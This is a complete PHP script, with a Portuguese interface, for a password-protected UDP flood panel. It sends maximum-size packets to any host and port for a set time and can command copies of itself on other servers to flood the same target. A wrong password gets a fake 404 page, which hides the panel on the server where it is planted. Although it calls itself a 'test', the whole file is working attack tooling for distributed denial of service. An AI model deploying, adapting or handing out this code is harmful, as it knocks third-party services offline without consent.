<?php
/*********************************************************************************************************
                          INICIO CONFIGURAÇÕES
*********************************************************************************************************/

error_reporting(0);
ini_set('display_errors',0);
date_default_timezone_set ("America/Sao_Paulo");
set_time_limit(0);
ignore_user_abort(FALSE);

$acess_url = '09K33M3O20D0RFGHM3-DG40!203!212223KFJV9RO04ELR'; //Password - example
$remote_links = array( //use the same $acess_url
    
);

/*********************************************************************************************************
                          FIM CONFIGURAÇÕES
*********************************************************************************************************/

/*********************************************************************************************************
                          INICIO FUNÇÕES
*********************************************************************************************************/

function send_packets($dest,$port,$time,$id=NULL){

  $packets = 0;
  $timeatual = time();
  $tempo_limite = $timeatual+$time;

  for($i=0;$i<65535;$i++){
          $out .= "V";
  }
  while(1){
    $packets++;
    if(time() > $tempo_limite){
            break;
    }
    
    $fp = fsockopen("udp://$dest", $port, $errno, $errstr, 5);
    if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
  }
  return "(".$id.")Teste concluido as ".date('H:i:s')." com $packets (" . round(($packets*65)/1024, 2) . " mB) pacotes enviados a cerca de ". round($packets/$time, 2) . " pacotes/s \n";
}// end send_packets

function multiRequest($data, $options = array()) {
 
  // array of curl handles
  $curly = array();
  // data to be returned
  $result = array();
 
  // multi handle
  $mh = curl_multi_init();
 
  // loop through $data and create curl handles
  // then add them to the multi-handle
  foreach ($data as $id => $d) {
 
    $curly[$id] = curl_init();
    curl_setopt($curly[$id], CURLOPT_SSL_VERIFYPEER, false);
    $url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
    curl_setopt($curly[$id], CURLOPT_URL,            $url);
    curl_setopt($curly[$id], CURLOPT_HEADER,         0);
    curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
 
    // post?
    if (is_array($d)) {
      if (!empty($d['post'])) {
        curl_setopt($curly[$id], CURLOPT_POST,       1);
        curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
      }
    }
 
    // extra options?
    if (!empty($options)) {
      curl_setopt_array($curly[$id], $options);
    }
    
    curl_multi_add_handle($mh, $curly[$id]);
  }
 
  // execute the handles
  $running = null;
  do {
    curl_multi_exec($mh, $running);
  } while($running > 0);
 
 
  // get content and remove handles
  foreach($curly as $id => $c) {
    $result[$id] = curl_multi_getcontent($c);
    curl_multi_remove_handle($mh, $c);
  }
 
  // all done
  curl_multi_close($mh);
 
  return $result;
}//fim multiRequest

/*********************************************************************************************************
                          FIM FUNÇÕES
*********************************************************************************************************/

if($_GET[p] === $acess_url){

  //does the magic
  //needs curl

  if($_GET[r] == 's' && $_GET[dest] != NULL && $_GET[port] != NULL && $_GET[time] != NULL && $_GET[id] != NULL){
    //remote command 
    echo send_packets($_GET[dest],$_GET[port],$_GET[time],$_GET[id]);
    exit;
  }

  
  $qtd_remote = count($remote_links);

  if($_POST[dest] != NULL && $_POST[port] != NULL && $_POST[time] != NULL){
    $log =  "Iniciando...\n";
    $log .= "Teste iniciado em ".date('d/m/Y')." as ".date('H:i:s')."\n";
    $log .= "Destino: ".$_POST[dest].":".$_POST[port]."\n";
    $log .= "Tempo: ".$_POST[time]." segundos\n";
    if($_POST[distributed] == "Y"){
      $log .= "Teste distribuido: Sim\n";

      $data = array();
      for($x=0; $x<$qtd_remote; $x++){
        $data[] = $remote_links[$x]."?p=".$acess_url."&r=s&dest=".$_POST[dest]."&port=".$_POST[port]."&time=".$_POST[time]."&id=".$x;
        $log .= 'Remote ID '.$x.": ".$remote_links[$x]."?p=".$acess_url."&r=s&dest=".$_POST[dest]."&port=".$_POST[port]."&time=".$_POST[time]."&id=".$x."\n";
      }
      $r = multiRequest($data);
      //var_dump($r);
      for($x=0; $x<$qtd_remote; $x++){
        $log .= $r[$x]."\n";
      }
      if($_POST[nolocal] != "Y"){
        $log .= send_packets($_POST[dest],$_POST[port],$_POST[time],'LOCAL');
      }
    }else{
      $log .= "Teste distribuido: Nao\n";
      $log .= send_packets($_POST[dest],$_POST[port],$_POST[time]);
    }
  }else if($_POST){
    $log = "Erro: Preencha todos os campos!";
  }else{
    $log = "Nenhum log...";
  }


  ?>
  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

  <script>

  function form_submit(){

    if(document.getElementById("dest").value.length < 1 || document.getElementById("port").value.length < 1 || document.getElementById("time").value.length < 1){
      document.getElementById('erro_todos_campos').style.display="block";
      return false;
    }else{
      document.getElementById('erro_todos_campos').style.display="none";
      document.getElementById('form').submit();
      document.getElementById('submit_btn').disabled=true;
      document.getElementById('submit_btn').value='Aguarde os '+document.getElementById('time').value+' segundos...';
      return true;
    }

  }

  </script>

  <div class="container" style="margin-top:10px;">
    <form action="" method="post" name="form" id="form">
      <?
      if(0 != $qtd_remote){
        ?>
        <div>
          <label for="distributed">Teste distribuido?</label>
          <input type="checkbox" name="distributed" id="distributed" value="Y" <? if($_POST[distributed] == "Y"){echo 'checked="checked"';} ?>> Sim
        </div>

        <div>
          <label for="nolocal">Enviar somente remotamente?</label>
          <input type="checkbox" name="nolocal" id="nolocal" value="Y" checked="checked"> Sim
        </div>
        <?
      }//end inf qtd_remote
      ?>
      <div>
        <label for="dest">Destino pacotes</label>
        <input type="text" name="dest" id="dest" value="<?php echo $_POST[dest]; ?>" placeholder="Destination" required> Use: domain.com ou IP
      </div>

      <div>
        <label for="port">Porta</label>
        <input type="number" name="port" id="port" value="<?php echo $_POST[port]; ?>" placeholder="Destination" required>
      </div>

      <div>
        <label for="time">Tempo (s)</label>
        <input type="number" name="time" id="time" value="<?php echo $_POST[time]; ?>" placeholder="Time" required>
      </div>

      <div>
        <input type="button" id="submit_btn" value="Iniciar" onClick="form_submit();">
      </div>

      <div class="alert alert-danger" role="alert" id="erro_todos_campos"><b>Oppss</b>! Preencha todos os campos...</div>

      <div>
        <label for="log">Log do teste</label>
        <textarea name="log" id="log" disabled="disabled"><?php echo $log; ?></textarea>
      </div>


    </form>
  </div>
  <style>
    form div{
      margin-top: 10px;
    }
    textarea{
      min-height: 300px;
      width: 100%;
      overflow: auto;

    }
    #erro_todos_campos{
      display: none;
    }
  </style>
  <?

}else{

  echo '

  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL '.$_SERVER ['REQUEST_URI'].' was not found on this server.</p>
  <p>Additionally, a 404 Not Found
  error was encountered while trying to use an ErrorDocument to handle the request.</p>
  </body></html>

  ';

}


?>

